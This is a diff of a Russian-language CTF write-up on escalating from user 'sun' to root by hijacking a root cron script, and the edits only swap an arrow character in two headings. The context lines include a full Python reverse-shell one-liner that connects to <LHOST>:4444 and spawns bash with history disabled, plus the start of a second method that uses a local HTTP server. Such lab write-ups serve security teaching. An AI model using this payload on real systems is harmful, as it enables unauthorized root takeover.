@@ -282,7 +282,7 @@ Aug 24 19:40:01 sun CRON[4629]: (root) CMD (python /home/sun/Documents/script.py
 
 Дальше все зависит только от твоей изобретательности. В рамках этого поста я покажу 2 способа, как можно ~~поиметь~~ заполучить желаемый флаг привилегированного пользователя.
 
-## PrivEsc: sun ⟶ root. Способ 1
+## PrivEsc: sun ➔ root. Способ 1
 Для начала предлагаю получить полноценный root-шелл, чтобы честно сказать, что мы полностью захватили машину. Для этого, не мудрствуя лукаво, перезапишем `script.py` стандартным для Пайтона reverse-shell'ом:
 ```
 sun@sun:~$ echo 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()' > Documents/script.py
@@ -341,7 +341,7 @@ root@sun:~# crontab -l
 
 За сим все, машина наша.
 
-## PrivEsc: sun ⟶ root. Способ 2
+## PrivEsc: sun ➔ root. Способ 2
 Чтобы не мучиться с реверс-шеллом, можно прибегнуть к хитрости. Для начала запустим на Kali-машине локальный HTTP-сервер (простого питоновского будет достаточно):
 ```
 root@kali:~/tmp# python -m SimpleHTTPServer 8888
